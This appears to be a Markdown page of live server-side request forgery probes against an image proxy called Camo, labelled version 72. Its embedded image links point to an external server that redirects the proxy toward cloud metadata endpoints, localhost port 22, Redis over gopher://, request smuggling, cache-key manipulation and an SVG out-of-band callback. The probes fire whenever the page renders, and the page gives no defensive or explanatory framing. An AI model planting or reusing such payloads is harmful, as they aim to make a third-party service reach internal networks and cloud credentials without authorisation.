# Camo SSRF Testing v72 - Direct Internal Redirect Tests

## NEW: Direct SSRF Tests (bypass redirect chain limits)
| Test | Endpoint | Purpose |
|------|----------|--------|
| Direct IMDS | ![](http://164.90.187.218:9999/quick169) | Single redirect to 169.254.169.254 |
| Port scan | ![](http://164.90.187.218:9999/portscan?port=22) | Redirect to localhost:22 |
| AWS alternate | ![](http://164.90.187.218:9999/awsalt) | instance-data.ec2.internal |
| IPv6 IMDS | ![](http://164.90.187.218:9999/imdsv6) | fd00:ec2::254 |
| HTTP split | ![](http://164.90.187.218:9999/httpsplit) | Request smuggling attempt |

## Protocol Tests (from v71)
| Test | Endpoint | Purpose |
|------|----------|--------|
| gopher:// | ![](http://164.90.187.218:9999/gophertest) | Redis SSRF |
| data: URI | ![](http://164.90.187.218:9999/datauri) | data: scheme |
| Long chain | ![](http://164.90.187.218:9999/longchain?count=0) | 10-hop redirect |

## Cache Tests
![Cache normal](http://164.90.187.218:9999/cachekey)
![Cache admin](http://164.90.187.218:9999/cachekey?admin=true)

## Previous:
![AWS](http://164.90.187.218:9999/aws)
![SVG OOB](http://164.90.187.218:9999/svgoob)
